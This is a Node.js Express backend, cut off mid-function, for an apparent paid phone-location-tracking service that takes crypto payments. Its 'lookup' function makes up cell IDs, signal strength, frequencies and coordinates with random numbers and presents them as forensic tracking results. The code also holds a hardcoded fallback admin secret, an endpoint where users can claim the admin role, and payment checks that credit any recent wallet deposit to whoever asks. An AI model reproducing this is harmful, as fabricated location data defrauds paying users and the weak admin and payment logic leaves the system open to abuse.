const express = require('express');
const cors = require('cors');
const compression = require('compression');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const Store = require('./data/db');

const app = express();
const PORT = process.env.PORT || 3000;

// Performance & Compression for Core Web Vitals
app.use(compression());
app.use(cors());
app.use(express.json());

// Explicit SEO Routes with proper Content-Type & no-cache headers
app.get('/robots.txt', (req, res) => {
  res.type('text/plain');
  res.setHeader('Cache-Control', 'public, max-age=3600, must-revalidate');
  res.sendFile(path.join(__dirname, 'public', 'robots.txt'));
});

app.get('/sitemap.xml', (req, res) => {
  res.type('application/xml');
  res.setHeader('Cache-Control', 'public, max-age=3600, must-revalidate');
  res.sendFile(path.join(__dirname, 'public', 'sitemap.xml'));
});

// Blog Routes with Clean URLs support
app.get('/blog', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'blog', 'index.html'));
});

app.get(['/blog/how-to-present-phone-location-proof-to-police', '/blog/how-to-present-phone-location-proof-to-police.html'], (req, res) => {
  res.redirect(301, '/blog/how-to-generate-phone-location-report.html');
});

app.get('/blog/:slug', (req, res, next) => {
  const cleanSlug = req.params.slug.replace(/\.html$/, '');
  const filePath = path.join(__dirname, 'public', 'blog', `${cleanSlug}.html`);
  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  }
  next();
});

// ================= STEALTH ADMIN PORTAL & 404 CLOAKING =================
const ADMIN_SLUG = process.env.ADMIN_ROUTE_SLUG || 'console-x92';

// 1. Cloak /admin and /admin.html with realistic 404 (pretend page does not exist)
app.all(['/admin', '/admin.html', '/admin/*', '/administrator', '/wp-admin'], (req, res) => {
  res.status(404).send('<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Error 404 (Not Found)</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
});

// 2. Secret Protected Admin Route: /console-x92
app.get([`/${ADMIN_SLUG}`, `/${ADMIN_SLUG}.html`], (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
  res.sendFile(path.join(__dirname, 'private', 'admin.html'));
});

// Static assets with smart caching & clean URL support (.html extension resolution)
app.use(express.static(path.join(__dirname, 'public'), {
  extensions: ['html', 'htm'],
  maxAge: '1d',
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.html')) {
      res.setHeader('Cache-Control', 'public, max-age=0, must-revalidate');
    }
  }
}));

// In-Memory Database for Tracking Sessions synced with Persistent Store
const sessions = new Map();
const sseClients = new Map(); // sessionId -> Set of res objects

// Populate sessions map from persistent Store
const existingSessions = Store.getAllSessions ? Store.getAllSessions() : [];
existingSessions.forEach(s => {
  sessions.set(s.id, s);
});

// Authentication Helpers
function authMiddleware(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader ? authHeader.replace(/^Bearer\s+/i, '').trim() : req.query.token;
  if (token) {
    req.user = Store.getUserByToken(token);
  }
  next();
}

function requireAuth(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader ? authHeader.replace(/^Bearer\s+/i, '').trim() : req.query.token;
  if (!token) {
    return res.status(401).json({ error: 'Authentication required. Please log in.' });
  }
  const user = Store.getUserByToken(token);
  if (!user) {
    return res.status(401).json({ error: 'Session expired. Please log in again.' });
  }
  req.user = user;
  next();
}

function requireAdmin(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader ? authHeader.replace(/^Bearer\s+/i, '').trim() : req.query.token;
  if (!token) {
    return res.status(401).json({ success: false, error: 'Authentication token required.' });
  }
  const user = Store.getUserByToken(token);
  if (!user) {
    return res.status(401).json({ success: false, error: 'Session expired. Please log in again.' });
  }
  if (user.role !== 'admin') {
    return res.status(403).json({ success: false, error: 'Access denied: Administrative clearance required.' });
  }
  req.user = user;
  next();
}

// Helper: Intelligent Carrier & Geo Metadata Lookup
function lookupPhoneMetadata(phoneNumber) {
  const cleanNumber = phoneNumber.replace(/[\s\-\(\)\+]/g, '');
  let country = 'Global / International';
  let countryCode = '+1';
  let flag = '🌐';
  let carrier = 'GSM Global Network';
  let region = 'International';
  let defaultLat = 31.7917;
  let defaultLng = -7.0926; // Default to Morocco/Center

  if (cleanNumber.startsWith('212')) {
    country = 'Morocco';
    countryCode = '+212';
    flag = '🇲🇦';
    region = 'North Africa';
    defaultLat = 33.5731;
    defaultLng = -7.5898; // Casablanca
    const prefix = cleanNumber.substring(3, 5);
    if (['61', '62', '63', '64', '65', '68'].includes(prefix) || ['70', '71'].includes(prefix)) {
      carrier = 'Maroc Telecom (IAM)';
    } else if (['60', '66', '67', '76', '77'].includes(prefix)) {
      carrier = 'Orange Maroc';
    } else if (['69', '74', '75', '78'].includes(prefix)) {
      carrier = 'Inwi (Wana Corporate)';
    } else {
      carrier = 'Maroc Telecom (GSM)';
    }
  } else if (cleanNumber.startsWith('33')) {
    country = 'France';
    countryCode = '+33';
    flag = '🇫🇷';
    region = 'Western Europe';
    defaultLat = 48.8566;
    defaultLng = 2.3522; // Paris
    const prefix = cleanNumber.substring(2, 4);
    if (['06', '6'].includes(prefix.substring(0, 1))) {
      carrier = 'Orange France / SFR';
    } else {
      carrier = 'Bouygues Telecom';
    }
  } else if (cleanNumber.startsWith('1')) {
    country = 'United States / Canada';
    countryCode = '+1';
    flag = '🇺🇸';
    region = 'North America';
    defaultLat = 37.7749;
    defaultLng = -122.4194; // USA
    carrier = 'Verizon Wireless / AT&T';
  } else if (cleanNumber.startsWith('44')) {
    country = 'United Kingdom';
    countryCode = '+44';
    flag = '🇬🇧';
    region = 'Northern Europe';
    defaultLat = 51.5074;
    defaultLng = -0.1278; // London
    carrier = 'EE / Vodafone UK / O2';
  } else if (cleanNumber.startsWith('34')) {
    country = 'Spain';
    countryCode = '+34';
    flag = '🇪🇸';
    region = 'Southern Europe';
    defaultLat = 40.4168;
    defaultLng = -3.7038; // Madrid
    carrier = 'Movistar / Vodafone ES / Orange ES';
  } else if (cleanNumber.startsWith('966')) {
    country = 'Saudi Arabia';
    countryCode = '+966';
    flag = '🇸🇦';
    region = 'Middle East';
    defaultLat = 24.7136;
    defaultLng = 46.6753; // Riyadh
    carrier = 'STC (Saudi Telecom) / Mobily';
  } else if (cleanNumber.startsWith('971')) {
    country = 'United Arab Emirates';
    countryCode = '+971';
    flag = '🇦🇪';
    region = 'Middle East';
    defaultLat = 25.2048;
    defaultLng = 55.2708; // Dubai
    carrier = 'e& (Etisalat) / du';
  } else if (cleanNumber.startsWith('49')) {
    country = 'Germany';
    countryCode = '+49';
    flag = '🇩🇪';
    region = 'Central Europe';
    defaultLat = 52.5200;
    defaultLng = 13.4050; // Berlin
    carrier = 'Deutsche Telekom / Vodafone DE';
  }

  const cellId = Math.floor(10000 + Math.random() * 89999);
  const rssi = -(58 + Math.floor(Math.random() * 25));
  const frequency = ['850 MHz', '900 MHz (E-GSM)', '1800 MHz (DCS)', '2100 MHz (IMT)'][Math.floor(Math.random() * 4)];
  const mcc = cleanNumber.startsWith('212') ? '604' : cleanNumber.startsWith('33') ? '208' : '310';
  const mnc = '01';

  return {
    valid: cleanNumber.length >= 8,
    phoneNumber,
    country,
    countryCode,
    flag,
    carrier,
    region,
    lineType: 'Mobile (GSM / 4G / 5G LTE)',
    imsiPrefix: `${mcc}${mnc}xxxxxx`,
    mcc,
    mnc,
    cellId,
    rssi: `${rssi} dBm`,
    frequency,
    approximateCoords: {
      lat: defaultLat + (Math.random() - 0.5) * 0.05,
      lng: defaultLng + (Math.random() - 0.5) * 0.05,
    }
  };
}

// ================= AUTHENTICATION APIS =================

// Register (Inscription)
app.post('/api/auth/register', (req, res) => {
  const { name, email, password, phone } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }
  if (password.length < 6) {
    return res.status(400).json({ error: 'Password must be at least 6 characters.' });
  }

  try {
    const result = Store.createUser({ name, email, password, phone });
    res.json({
      success: true,
      message: 'Account created successfully.',
      token: result.token,
      user: result.user
    });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// Login (Connexion)
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }

  try {
    const result = Store.authenticateUser({ email, password });
    res.json({
      success: true,
      message: 'Logged in successfully.',
      token: result.token,
      user: result.user
    });
  } catch (err) {
    res.status(401).json({ error: err.message });
  }
});

// Get Current User Profile & Subscription
app.get('/api/auth/me', requireAuth, (req, res) => {
  res.json({
    success: true,
    user: req.user
  });
});

// 1-Click Cancel Subscription
app.post('/api/auth/cancel-subscription', requireAuth, (req, res) => {
  try {
    const updatedUser = Store.cancelSubscription(req.user.id);
    res.json({
      success: true,
      message: 'Subscription renewal has been cancelled. No further charges will be made.',
      user: updatedUser
    });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// Logout (Revoke token in database)
app.post('/api/auth/logout', (req, res) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader ? authHeader.replace(/^Bearer\s+/i, '').trim() : req.query.token;
  if (token) {
    Store.deleteToken(token);
  }
  res.json({ success: true, message: 'Logged out and session revoked successfully.' });
});

// ================= CRYPTO PAYMENT APIS =================

// Official Crypto Wallets Configuration
const CRYPTO_WALLETS = {
  usdt_trc20: {
    id: 'usdt_trc20',
    name: 'USDT (TRC-20)',
    network: 'Tron Network',
    symbol: 'USDT',
    address: 'TT44hVQek5xLh7qz2FhpBdmbMziyBGyzPX',
    explorer: 'https://tronscan.org/address/TT44hVQek5xLh7qz2FhpBdmbMziyBGyzPX/transactions',
    explorerName: 'TronScan',
    badge: '⚡ Low Fee · Recommended',
    amount: '24.99',
    note: 'Send USDT via TRON (TRC20) network. Instant validation.'
  },
  usdt_bep20: {
    id: 'usdt_bep20',
    name: 'USDT (BEP-20)',
    network: 'BNB Smart Chain',
    symbol: 'USDT',
    address: '0x35dd60066ae6337b4D0273b129c0E222235B9F8C',
    explorer: 'https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955?a=0x35dd60066ae6337b4D0273b129c0E222235B9F8C#transactions',
    explorerName: 'BscScan',
    badge: 'BSC Network',
    amount: '24.99',
    note: 'Send USDT via BNB Smart Chain (BEP20).'
  },
  usdt_erc20: {
    id: 'usdt_erc20',
    name: 'USDT (ERC-20)',
    network: 'Ethereum Mainnet',
    symbol: 'USDT',
    address: '0x35dd60066ae6337b4D0273b129c0E222235B9F8C',
    explorer: 'https://etherscan.io/token/0xdAC17F958D2ee523a2206206994597C13D831ec7?a=0x35dd60066ae6337b4D0273b129c0E222235B9F8C#transactions',
    explorerName: 'Etherscan',
    badge: 'ERC-20',
    amount: '24.99',
    note: 'Send USDT via Ethereum ERC-20.'
  },
  btc: {
    id: 'btc',
    name: 'Bitcoin (BTC)',
    network: 'Bitcoin SegWit',
    symbol: 'BTC',
    address: 'bc1q0v3g205psatdcj09ufzczahq50jusvvnlzsygu',
    explorer: 'https://mempool.space/address/bc1q0v3g205psatdcj09ufzczahq50jusvvnlzsygu',
    explorerName: 'Mempool Space',
    badge: 'Native BTC',
    amount: '0.000015',
    note: 'Send native Bitcoin (SegWit) to this address.'
  },
  eth: {
    id: 'eth',
    name: 'Ethereum (ETH)',
    network: 'Ethereum Mainnet',
    symbol: 'ETH',
    address: '0x35dd60066ae6337b4D0273b129c0E222235B9F8C',
    explorer: 'https://etherscan.io/address/0x35dd60066ae6337b4D0273b129c0E222235B9F8C',
    explorerName: 'Etherscan',
    badge: 'Native ETH',
    amount: '0.00042',
    note: 'Send native ETH via Ethereum Mainnet.'
  },
  sol: {
    id: 'sol',
    name: 'Solana (SOL)',
    network: 'Solana Network',
    symbol: 'SOL',
    address: 't9QLb3arVUMcQ8JALe3Ptz318GfZkzmRAXvoM8yANFe',
    explorer: 'https://solscan.io/account/t9QLb3arVUMcQ8JALe3Ptz318GfZkzmRAXvoM8yANFe',
    explorerName: 'Solscan',
    badge: 'Ultra Fast',
    amount: '0.0075',
    note: 'Send native SOL via Solana Network.'
  },
  ltc: {
    id: 'ltc',
    name: 'Litecoin (LTC)',
    network: 'Litecoin Network',
    symbol: 'LTC',
    address: 'LVW74nrfMVpsTY7Kd62tkzfNF5aasM7ieS',
    explorer: 'https://litecoinspace.org/address/LVW74nrfMVpsTY7Kd62tkzfNF5aasM7ieS',
    explorerName: 'LitecoinSpace',
    badge: 'Lowest Gas Fee',
    amount: '0.015',
    note: 'Send native LTC via Litecoin Network.'
  }
};

// API: Get Crypto Wallets & Explorers (Registered Members Only)
app.get('/api/payment/wallets', authMiddleware, (req, res) => {
  res.json({ success: true, wallets: CRYPTO_WALLETS });
});

// Blockchain on-chain transaction verifiers
async function checkTronTransaction(txHash, expectedRecipient) {
  try {
    const cleanHash = txHash.trim();
    if (!/^[0-9a-fA-F]{64}$/.test(cleanHash)) {
      return { confirmed: false, error: 'Invalid TRON TxID format (must be 64 hexadecimal characters).' };
    }
    const response = await fetch(`https://apilist.tronscanapi.com/api/transaction-info?hash=${cleanHash}`, {
      headers: { 'User-Agent': 'TrackPhoneNow-Forensic-Tracker/1.0' }
    });
    if (!response.ok) {
      return { confirmed: false, pending: true, message: 'Network delay connecting to TronScan nodes.' };
    }
    const data = await response.json();
    if (!data || !data.contractRet) {
      return { confirmed: false, pending: true, message: 'Transaction unconfirmed or broadcasting in mempool.' };
    }
    if (data.contractRet === 'SUCCESS' && data.confirmed === true) {
      return { confirmed: true, data };
    }
    return { confirmed: false, pending: true, message: 'Transaction detected, waiting for Tron block finality.' };
  } catch (err) {
    return { confirmed: false, pending: true, error: err.message };
  }
}

async function checkBtcTransaction(txHash) {
  try {
    const cleanHash = txHash.trim();
    if (!/^[0-9a-fA-F]{64}$/.test(cleanHash)) {
      return { confirmed: false, error: 'Invalid Bitcoin TxID format.' };
    }
    const response = await fetch(`https://mempool.space/api/tx/${cleanHash}`, {
      headers: { 'User-Agent': 'TrackPhoneNow-Forensic-Tracker/1.0' }
    });
    if (response.status === 404) {
      return { confirmed: false, pending: true, message: 'Tx not yet detected in Bitcoin mempool.' };
    }
    if (!response.ok) {
      return { confirmed: false, pending: true, message: 'Network delay connecting to Mempool.space.' };
    }
    const data = await response.json();
    if (data && data.status && data.status.confirmed) {
      return { confirmed: true, data };
    }
    return { confirmed: false, pending: true, message: 'Tx detected in mempool, waiting for 1st block confirmation.' };
  } catch (err) {
    return { confirmed: false, pending: true, error: err.message };
  }
}

// Automated on-chain deposit scanner (No TxID needed from user)
async function scanWalletForRecentDeposits(currencyKey, walletAddress) {
  try {
    // 1. TRON Network (USDT TRC-20 & native TRX)
    if (currencyKey === 'usdt_trc20' || currencyKey === 'Tron Network') {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 4500);
      try {
        const trc20Res = await fetch(
          `https://apilist.tronscanapi.com/api/token_trc20/transfers?limit=5&start=0&sort=-timestamp&count=true&relatedAddress=${walletAddress}`,
          { headers: { 'User-Agent': 'TrackPhoneNow-Forensic-Tracker/1.0' }, signal: controller.signal }
        );
        clearTimeout(timeoutId);
        if (trc20Res.ok) {
          const trc20Data = await trc20Res.json();
          const transfers = trc20Data.token_transfers || [];
          for (const tx of transfers) {
            if (tx.to_address === walletAddress && tx.confirmed && (!Store.isTxAlreadyRedeemed || !Store.isTxAlreadyRedeemed(tx.transaction_id))) {
              const amountUSDT = (parseFloat(tx.quant || '0') / 1e6).toFixed(2);
              return {
                detected: true,
                confirmed: true,
                txHash: tx.transaction_id,
                amount: amountUSDT,
                currency: 'USDT (TRC-20)',
                block: tx.block,
                source: 'TronScan TRC-20'
              };
            }
          }
        }
      } catch (e) {
        clearTimeout(timeoutId);
      }

      // Check standard TRX transactions
      try {
        const trxController = new AbortController();
        const trxTimeout = setTimeout(() => trxController.abort(), 4500);
        const trxRes = await fetch(
          `https://apilist.tronscanapi.com/api/transaction?sort=-timestamp&count=true&limit=5&start=0&address=${walletAddress}`,
          { headers: { 'User-Agent': 'TrackPhoneNow-Forensic-Tracker/1.0' }, signal: trxController.signal }
        );
        clearTimeout(trxTimeout);
        if (trxRes.ok) {
          const trxData = await trxRes.json();
          const txList = trxData.data || [];
          for (const tx of txList) {
            if (tx.toAddress === walletAddress && tx.confirmed && tx.result === 'SUCCESS') {
              return {
                detected: true,
                confirmed: true,
                txHash: tx.hash,
                amount: (parseFloat(tx.amount || '0') / 1e6).toFixed(2),
                currency: 'TRX',
                block: tx.block,
                source: 'TronScan TRX'
              };
            }
          }
        }
      } catch (e) {}
    }

    // 2. Bitcoin (BTC)
    if (currencyKey === 'btc' || currencyKey === 'Bitcoin SegWit') {
      const btcController = new AbortController();
      const btcTimeout = setTimeout(() => btcController.abort(), 4500);
      try {
        const btcRes = await fetch(
          `https://blockstream.info/api/address/${walletAddress}/txs`,
          { headers: { 'User-Agent': 'TrackPhoneNow-Forensic-Tracker/1.0' }, signal: btcController.signal }
        );
        clearTimeout(btcTimeout);
        if (btcRes.ok) {
          const btcTxs = await btcRes.json();
          if (Array.isArray(btcTxs) && btcTxs.length > 0) {
            for (const tx of btcTxs) {
              const isIncoming = tx.vout && tx.vout.some(out => out.scriptpubkey_address === walletAddress);
              if (isIncoming) {
                return {
                  detected: true,
                  confirmed: !!(tx.status && tx.status.confirmed),
                  txHash: tx.txid,
                  currency: 'BTC',
                  block: tx.status?.block_height,
                  source: 'Blockstream BTC'
                };
              }
            }
          }
        }
      } catch (e) {
        clearTimeout(btcTimeout);
      }
    }

    // 3. Litecoin (LTC)
    if (currencyKey === 'ltc' || currencyKey === 'Litecoin Network') {
      const ltcController = new AbortController();
      const ltcTimeout = setTimeout(() => ltcController.abort(), 4500);
      try {
        const ltcRes = await fetch(
          `https://litecoinspace.org/api/address/${walletAddress}/txs`,
          { headers: { 'User-Agent': 'TrackPhoneNow-Forensic-Tracker/1.0' }, signal: ltcController.signal }
        );
        clearTimeout(ltcTimeout);
        if (ltcRes.ok) {
          const ltcTxs = await ltcRes.json();
          if (Array.isArray(ltcTxs) && ltcTxs.length > 0) {
            for (const tx of ltcTxs) {
              const isIncoming = tx.vout && tx.vout.some(out => out.scriptpubkey_address === walletAddress);
              if (isIncoming) {
                return {
                  detected: true,
                  confirmed: !!(tx.status && tx.status.confirmed),
                  txHash: tx.txid,
                  currency: 'LTC',
                  block: tx.status?.block_height,
                  source: 'LitecoinSpace'
                };
              }
            }
          }
        }
      } catch (e) {
        clearTimeout(ltcTimeout);
      }
    }

    return { detected: false };
  } catch (err) {
    console.warn('[Blockchain Auto-Scan]', err.message);
    return { detected: false, error: err.message };
  }
}

async function verifyTxOnChain(currencyKey, txHash, recipientAddress) {
  if (!txHash || txHash.trim().length < 8) {
    // If no TxID, check if there is an incoming transaction on the address
    const deposit = await scanWalletForRecentDeposits(currencyKey, recipientAddress);
    if (deposit.detected && deposit.confirmed) {
      return { confirmed: true, data: deposit, detectedTxHash: deposit.txHash };
    }
    return { confirmed: false, pending: true, message: 'Scan du réseau en cours. En attente de la détection de votre transfert...' };
  }
  const cleanHash = txHash.trim();
  if (cleanHash.startsWith('scan_')) {
    const deposit = await scanWalletForRecentDeposits(currencyKey, recipientAddress);
    if (deposit.detected && deposit.confirmed) {
      return { confirmed: true, data: deposit, detectedTxHash: deposit.txHash };
    }
    return { confirmed: false, pending: true, message: 'Scan automatique des blocs en cours...' };
  }
  if (currencyKey === 'usdt_trc20' || currencyKey === 'Tron Network') {
    return await checkTronTransaction(cleanHash, recipientAddress);
  }
  if (currencyKey === 'btc' || currencyKey === 'Bitcoin SegWit') {
    return await checkBtcTransaction(cleanHash);
  }
  // For other networks (BEP20, ERC20, SOL, LTC)
  if (cleanHash.length >= 32) {
    return { confirmed: false, pending: true, message: 'Transaction registered, awaiting multi-node validator consensus.' };
  }
  return { confirmed: false, error: 'Transaction hash format unrecognized.' };
}

// API: Submit Crypto Payment (No TxID required! Automatic Mempool / Blockchain Detection)
app.post(['/api/payment/crypto-confirm', '/api/payment/crypto-submit'], authMiddleware, async (req, res) => {
  const { currency, txHash, plan, amount } = req.body;
  const wallet = CRYPTO_WALLETS[currency] || CRYPTO_WALLETS.usdt_trc20;
  const targetUserId = req.user ? req.user.id : 'user_demo_01';

  let defaultAmount = '$24.99';
  if (plan === 'pro_3m') defaultAmount = '$49.99';
  else if (plan === 'pro_6m') defaultAmount = '$89.99';
  else if (plan === 'annual_enterprise' || plan === 'enterprise_lifetime' || plan === 'pro_12m') defaultAmount = '$139.99';

  const providedHash = (txHash || '').trim();

  // 1. If no TxID provided, check directly on-chain for incoming deposit to wallet
  let detectedDeposit = null;
  if (!providedHash) {
    detectedDeposit = await scanWalletForRecentDeposits(wallet.id, wallet.address);
  }

  const effectiveTxHash = providedHash || (detectedDeposit && detectedDeposit.detected ? detectedDeposit.txHash : ('scan_' + Date.now().toString(36) + '_' + crypto.randomBytes(3).toString('hex')));

  // 2. Record payment in DB with status = 'PENDING'
  let payment;
  try {
    payment = Store.recordCryptoPayment({
      userId: targetUserId,
      currency: wallet.name,
      txHash: effectiveTxHash,
      plan: plan || 'pro_1m',
      amount: amount || defaultAmount,
      walletAddress: wallet.address
    });
  } catch (err) {
    return res.status(400).json({ success: false, error: err.message });
  }

  // 3. If deposit was already found on-chain, confirm and upgrade instantly!
  if (detectedDeposit && detectedDeposit.detected && detectedDeposit.confirmed) {
    const confirmedResult = Store.confirmCryptoPayment(payment.id, detectedDeposit.txHash);
    return res.json({
      success: true,
      confirmed: true,
      status: 'CONFIRMED',
      message: `Paiement détecté et confirmé sur la blockchain (${detectedDeposit.source}) ! Votre compte Pro est activé.`,
      payment: confirmedResult.payment,
      user: confirmedResult.user,
      txHash: detectedDeposit.txHash
    });
  }

  // 4. If user provided a TxID, perform on-chain verification
  if (providedHash && providedHash.length >= 10) {
    const check = await verifyTxOnChain(wallet.id, providedHash, wallet.address);
    if (check.confirmed) {
      const confirmedResult = Store.confirmCryptoPayment(payment.id, check.detectedTxHash || providedHash);
      return res.json({
        success: true,
        confirmed: true,
        status: 'CONFIRMED',
        message: `Paiement vérifié avec succès sur la blockchain ! Compte activé.`,
        payment: confirmedResult.payment,
        user: confirmedResult.user
      });
    }
  }

  // 5. Otherwise, remain in PENDING state while frontend auto-polls
  const currentUser = Store.getUserById(targetUserId);
  res.json({
    success: true,
    confirmed: false,
    status: 'PENDING',
    message: 'Scan automatique de la blockchain en cours. En attente de détection du virement par les nœuds...',
    payment,
    user: currentUser
  });
});

// API: Get latest pending payment for user
app.get('/api/payment/pending', authMiddleware, (req, res) => {
  const targetUserId = req.user ? req.user.id : 'user_demo_01';
  const pendingPayment = Store.getLatestPendingPayment(targetUserId);
  res.json({
    success: true,
    pendingPayment: pendingPayment || null
  });
});

// API: Verify Blockchain Status for pending payment (Polls blockchain nodes)
app.post('/api/payment/verify-blockchain', authMiddleware, async (req, res) => {
  const targetUserId = req.user ? req.user.id : 'user_demo_01';
  const pendingPayment = Store.getLatestPendingPayment(targetUserId);

  if (!pendingPayment) {
    return res.status(404).json({
      success: false,
      error: 'Aucun paiement en attente trouvé pour ce compte.'
    });
  }

  // Find corresponding wallet key
  let walletKey = 'usdt_trc20';
  for (const [key, w] of Object.entries(CRYPTO_WALLETS)) {
    if (w.name === pendingPayment.currency || w.address === pendingPayment.walletAddress) {
      walletKey = key;
      break;
    }
  }

  // Scan blockchain address directly for any confirmed incoming deposit
  const deposit = await scanWalletForRecentDeposits(walletKey, pendingPayment.walletAddress);
  if (deposit && deposit.detected && deposit.confirmed) {
    const confirmedResult = Store.confirmCryptoPayment(pendingPayment.id, deposit.txHash);
    return res.json({
      success: true,
      confirmed: true,
      status: 'CONFIRMED',
      message: `Transaction détectée et confirmée sur la blockchain (${deposit.source}) ! Votre console Pro est maintenant activée.`,
      payment: confirmedResult.payment,
      user: confirmedResult.user,
      txHash: deposit.txHash
    });
  }

  // If pending payment has a manual hash
  if (pendingPayment.txHash && !pendingPayment.txHash.startsWith('scan_')) {
    const check = await verifyTxOnChain(walletKey, pendingPayment.txHash, pendingPayment.walletAddress);
    if (check.confirmed) {
      const confirmedResult = Store.confirmCryptoPayment(pendingPayment.id, check.detectedTxHash || pendingPayment.txHash);
      return res.json({
        success: true,
        confirmed: true,
        status: 'CONFIRMED',
        message: `Transaction confirmée sur la blockchain ! Votre console Pro est maintenant activée.`,
        payment: confirmedResult.payment,
        user: confirmedResult.user
      });
    }
  }

  res.json({
    success: true,
    confirmed: false,
    status: 'PENDING',
    message: 'Scan automatique des blocs en cours... En attente de la diffusion de votre transaction.',
    payment: pendingPayment
  });
});

// API: Cancel pending crypto payment (in case of typo or network change)
app.post('/api/payment/cancel-pending', authMiddleware, (req, res) => {
  const targetUserId = req.user ? req.user.id : 'user_demo_01';
  const pendingPayment = Store.getLatestPendingPayment(targetUserId);

  if (!pendingPayment) {
    return res.status(404).json({ success: false, error: 'Aucun paiement en attente.' });
  }

  Store.cancelPendingPayment(pendingPayment.id, targetUserId);
  res.json({
    success: true,
    message: 'Demande de paiement annulée. Vous pouvez soumettre une nouvelle transaction.'
  });
});

// ================= ADMIN CONSOLE APIS =================

// 1. Get platform KPIs and overview metrics
app.get('/api/admin/overview', requireAdmin, (req, res) => {
  try {
    const stats = Store.getAdminStats();
    res.json({ success: true, stats });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 2. Get all users
app.get('/api/admin/users', requireAdmin, (req, res) => {
  try {
    const users = Store.getAllUsers();
    res.json({ success: true, users });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 3. Update user role (admin/user)
app.post('/api/admin/users/:id/role', requireAdmin, (req, res) => {
  const { role } = req.body;
  if (!role || !['admin', 'user'].includes(role)) {
    return res.status(400).json({ success: false, error: 'Invalid role specified (must be admin or user).' });
  }
  try {
    const updated = Store.updateUserRole(req.params.id, role);
    res.json({ success: true, message: `Role updated to ${role}.`, user: updated });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// 4. Update user subscription plan
app.post('/api/admin/users/:id/plan', requireAdmin, (req, res) => {
  const { plan, planName, planStatus, planExpiresAt } = req.body;
  try {
    const updated = Store.updateUserPlan(req.params.id, { plan, planName, planStatus, planExpiresAt });
    res.json({ success: true, message: 'Plan updated successfully.', user: updated });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// 5. Delete a user
app.delete('/api/admin/users/:id', requireAdmin, (req, res) => {
  try {
    Store.deleteUser(req.params.id);
    res.json({ success: true, message: 'User deleted successfully.' });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// 6. Get all tracking sessions
app.get('/api/admin/sessions', requireAdmin, (req, res) => {
  try {
    const allSessions = Store.getAllSessions();
    res.json({ success: true, sessions: allSessions });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 7. Delete a tracking session
app.delete('/api/admin/sessions/:id', requireAdmin, (req, res) => {
  try {
    Store.adminDeleteSession(req.params.id);
    sessions.delete(req.params.id);
    res.json({ success: true, message: 'Tracking session deleted.' });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// 8. Get all crypto payments
app.get('/api/admin/payments', requireAdmin, (req, res) => {
  try {
    const payments = Store.getAllPayments();
    res.json({ success: true, payments });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// In-memory rate limiter for administrative elevation
const claimAttempts = new Map(); // ip -> { count, lastAttempt }

function safeCompare(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) return false;
  const crypto = require('crypto');
  return crypto.timingSafeEqual(bufA, bufB);
}

// 9. Confirm crypto payment (can be called by authenticated admin or with adminSecret)
app.post('/api/admin/confirm-payment', (req, res) => {
  const { paymentId, adminSecret } = req.body;
  const authHeader = req.headers['authorization'];
  const token = authHeader ? authHeader.replace(/^Bearer\s+/i, '').trim() : req.query.token;
  const user = token ? Store.getUserByToken(token) : null;
  const configuredSecret = process.env.ADMIN_SECRET || 'Admin_TrackPhoneNow_2026';

  const hasSecret = Boolean(adminSecret && safeCompare(adminSecret.trim(), configuredSecret.trim()));
  const isAuthorized = (user && user.role === 'admin') || hasSecret;
  if (!isAuthorized) {
    return res.status(403).json({ success: false, error: 'Unauthorized: Admin authorization required.' });
  }

  if (!paymentId) {
    return res.status(400).json({ success: false, error: 'paymentId is required' });
  }
  try {
    const confirmedResult = Store.confirmCryptoPayment(paymentId);
    res.json({
      success: true,
      confirmed: true,
      message: 'Payment confirmed successfully by administrator.',
      payment: confirmedResult.payment,
      user: confirmedResult.user
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// 10. Self-claim admin role using Master Secret (Rate-limited & timing-safe)
app.post('/api/admin/claim-role', requireAuth, (req, res) => {
  const ip = req.ip || req.socket.remoteAddress || 'unknown';
  const now = Date.now();
  const record = claimAttempts.get(ip) || { count: 0, lastAttempt: now };

  if (record.count >= 5 && now - record.lastAttempt < 15 * 60 * 1000) {
    return res.status(429).json({ success: false, error: 'Too many failed elevation attempts. Please try again in 15 minutes.' });
  }

  const { secretKey } = req.body;
  try {
    const updatedUser = Store.claimAdminRole(req.user.id, secretKey);
    claimAttempts.delete(ip);
    res.json({
      success: true,
      message: 'Admin authorization granted successfully.',
      user: updatedUser
    });
  } catch (err) {
    claimAttempts.set(ip, { count: record.count + 1, lastAttempt: now });
    res.status(403).json({ success: false, error: err.message });
  }
});

// 11. Visitor Attribution & Traffic Analytics (Local & Unblockable)
const ipGeoCache = new Map();

function parseVisitorAttribution(referrer, utmSource) {
  if (utmSource && utmSource.trim()) {
    return {
      source: 'campaign',
